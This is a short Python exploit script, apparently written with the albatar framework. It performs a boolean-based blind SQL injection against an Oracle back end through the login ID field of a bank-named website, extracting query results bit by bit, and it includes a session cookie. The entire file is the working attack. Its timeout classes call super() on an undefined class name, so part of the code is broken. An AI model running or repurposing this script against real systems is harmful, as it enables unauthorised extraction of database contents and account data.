from albatar import *
from urllib.parse import quote

PROXIES = {}#'http': 'http://127.0.0.1:8082', 'https': 'http://127.0.0.1:8082'}
HEADERS = ['User-Agent: Mozilla/5.0', 'Cookie: JSESSIONID=F61864741FD42E2699978FE227EB5456']
TIMEOUT = 5

def test_state_grep(headers, body, time):
  if 'Sorry, login ID exists' in body:
    return 1
  else: # timeout
    return 0

class Requester_HTTP_pycurl_timeout(Requester_HTTP_pycurl):

  def __init__(self, *args, **kwargs):
    super(Requester_HTTP_pycurl_timeout, self).__init__(*args, **kwargs)

    self.fp.setopt(pycurl.TIMEOUT, TIMEOUT)

  def test(self, payload):
    try:
      return super(Requester_timeout, self).test(payload)
    except pycurl.error as e:
      if 'timed out' not in str(e):
        raise e
      return self.review_response(payload, 0, '', '', TIMEOUT, -1)

class Requester_HTTP_requests_timeout(Requester_HTTP_requests):
  def __init__(self, *args, **kwargs):
    super(Requester_HTTP_requests_timeout, self).__init__(*args, **kwargs)

    self.request_kwargs['timeout'] = TIMEOUT

  def test(self, payload):
    try:
      return super(Requester_timeout, self).test(payload)
    
    except requests.exceptions.Timeout:
      return self.review_response(payload, 0, '', '', TIMEOUT, -1)

def oracle_boolean():

  template = "' and 1=(select case when (select bitand((select ascii(substr((${query}),${char_pos})) from dual),${bit_mask}) from dual)=${bit_mask} then 1 else 0 end from dual)--"

  def make_requester():
    return Requester_HTTP_requests_timeout(
      proxies = PROXIES,
      headers = HEADERS,
      url = 'https://kikoobank.com/',
      method = 'POST',
      body = 'user.loginId=user2${injection}',
      response_processor = test_state_grep,
      encode_payload = quote,
      )

  return Method_bitwise(make_requester, template, num_threads=1, confirm_char=True)

sqli = Oracle_Blind(oracle_boolean())

for r in sqli.exploit():
  print(r)

# vim: ts=2 sw=2 sts=2 et fdm=marker
